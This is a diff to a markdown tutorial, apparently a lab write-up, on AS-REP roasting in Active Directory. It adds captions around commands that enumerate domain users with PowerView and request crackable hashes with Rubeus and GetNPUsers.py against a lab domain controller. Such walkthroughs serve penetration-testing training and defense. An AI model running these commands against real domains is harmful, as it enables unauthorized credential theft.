@@ -66,15 +66,18 @@ Rubeus.exe asreproast /format:john /outfile:hash.txt
 <img src="/img/asrep/save.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 ## ASREP Roasting with  GetUserSPNs.py
-
+Get Domain User
 ```
 Import-Module .\powerview.ps1
 Get-DomainUser | select name
 ```
 <img src="/img/asrep/users.PNG" alt="Getting-gz" width="1000" height="200"> 
 
+saved users in the text file
+
 <img src="/img/asrep/users1.PNG" alt="Getting-gz" width="1000" height="200"> 
- 
+
+If a user does  exist with preauthentication disabled, you will get the hash 
 ```
 python3 GetNPUsers.py karim.net/ -usersfile  users.txt -dc-ip 192.168.128.140
 ```
